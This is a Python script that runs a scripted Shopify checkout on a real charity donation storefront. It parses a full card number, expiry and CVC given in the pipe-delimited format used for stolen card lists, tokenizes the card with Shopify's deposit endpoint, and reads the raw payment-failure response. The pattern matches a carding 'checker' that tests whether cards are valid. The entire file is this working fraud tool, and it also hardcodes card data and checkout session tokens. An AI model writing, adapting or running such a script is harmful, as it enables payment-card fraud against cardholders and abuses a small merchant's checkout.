import requests, re, json, sys
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

card = '4033060047342909|08|28|667'
n, mm, yy, cvc = card.strip().split('|')

r = requests.Session()
r.headers.update({
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
})

# STEP 1: Add product
headers1 = {
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvtMfMS7ihgPqCSmW',
    'origin': 'https://wiredministries.com',
    'referer': 'https://wiredministries.com/products/donate',
}
data1 = (
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="form_type"\r\n\r\nproduct\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="utf8"\r\n\r\n✓\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="id"\r\n\r\n6889401221181\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="quantity"\r\n\r\n1\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="add"\r\n\r\n\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="product-id"\r\n\r\n516727406653\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="section-id"\r\n\r\nproduct-template\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW--\r\n'
)
r.post('https://wiredministries.com/cart/add', headers=headers1, data=data1)

# STEP 2: Checkout URL & extract live checkout tokens
data2 = {'updates[]': '1', 'note': '', 'checkout': 'Check out'}
r2 = r.post('https://wiredministries.com/cart', data=data2)
checkout_url = r2.url
print("Live Checkout URL:", checkout_url)

# STEP 3: Tokenize on deposit.shopifycs.com
headers3 = {
    'accept': 'application/json',
    'content-type': 'application/json',
    'origin': 'https://checkout.shopifycs.com',
    'referer': 'https://checkout.shopifycs.com/',
}
json_data3 = {
    'credit_card': {'number': n, 'month': mm, 'year': yy, 'verification_value': cvc, 'name': 'John Doe'},
    'payment_session_scope': 'wiredministries.com'
}
res3 = requests.post('https://deposit.shopifycs.com/sessions', headers=headers3, json=json_data3)
session_id = res3.json().get('id')
print("Shopify Deposit Session ID:", session_id)

# STEP 4: Submit original shopify_charge.py Step 4 to see its response
headers4 = {
    'accept': 'application/json',
    'content-type': 'application/json',
    'origin': 'https://wiredministries.com',
    'referer': 'https://wiredministries.com/',
    'x-checkout-one-session-token': 'MTk3c2EzTWhpb1lyeWtnaFA5QlhDc29nTjRKUzNxeEJqMkZ3QkNjVnRVT0kvVk1Gcm84ckV0VXBJTzVaY2hHaHRXak5kWWY0NGxnYW4xS2U4dE9NNmM5dkplNE1ISnd0Q29aZ1IyTWNTU2cvTURPc00yVWNUaGhoS21WQzBmRzZOOW9IZE85RHBTU3ZmR1dRVC9SWFBPVHg5MnRjMElWUDhlV1M0aVRyeHpCdzM2NTk1MkhZMkRlSEIvZ25jWm42VDZJQ0d6eitsVkxneVZQTk9GbWpQdm95bVV5LzBnb1U2cW5uYWVidG9oeHBFRktxYUl6S1RuVTJ0cVNjSjdiVnU2aUFwSjhxNTdpNVlQZUpzdCs1U2FYTmxqblN1NUtLVjVJaS0tRGh3aktjMi9yZ2V6dHdiMC0tOHV3MXExUVY4Z1hoTk5qT21URDR1dz09',
    'x-checkout-web-build-id': session_id,
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-server-handling': 'fast',
    'x-checkout-web-server-rendering': 'no',
    'x-checkout-web-source-id': 'Z2NwLWV1cm9wZS13ZXN0MTowMUo2NVlXVlhRQVI0QUtOWEM4VlBaTTJIWQ',
}
params4 = {'operationName': 'PollForReceipt'}
json_data4 = {
    'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}}',
    'variables': {
        'receiptId': 'gid://shopify/ProcessedReceipt/1505710342338',
        'sessionToken': 'MTk3c2EzTWhpb1lyeWtnaFA5QlhDc29nTjRKUzNxeEJqMkZ3QkNjVnRVT0kvVk1Gcm84ckV0VXBJTzVaY2hHaHRXak5kWWY0NGxnYW4xS2U4dE9NNmM5dkplNE1ISnd0Q29aZ1IyTWNTU2cvTURPc00yVWNUaGhoS21WQzBmRzZOOW9IZE85RHBTU3ZmR1dRVC9SWFBPVHg5MnRjMElWUDhlV1M0aVRyeHpCdzM2NTk1MkhZMkRlSEIvZ25jWm42VDZJQ0d6eitsVkxneVZQTk9GbWpQdm95bVV5LzBnb1U2cW5uYWVidG9oeHBFRktxYUl6S1RuVTJ0cVNjSjdiVnU2aUFwSjhxNTdpNVlQZUpzdCs1U2FYTmxqblN1NUtLVjVJaS0tRGh3aktjMi9yZ2V6dHdiMC0tOHV3MXExUVY4Z1hoTk5qT21URDR1dz09'
    },
    'operationName': 'PollForReceipt'
}
res4 = r.post('https://wiredministries.com/checkouts/unstable/graphql', params=params4, headers=headers4, json=json_data4)
print("Step 4 Raw GraphQL Response:", res4.status_code, "|", res4.text)
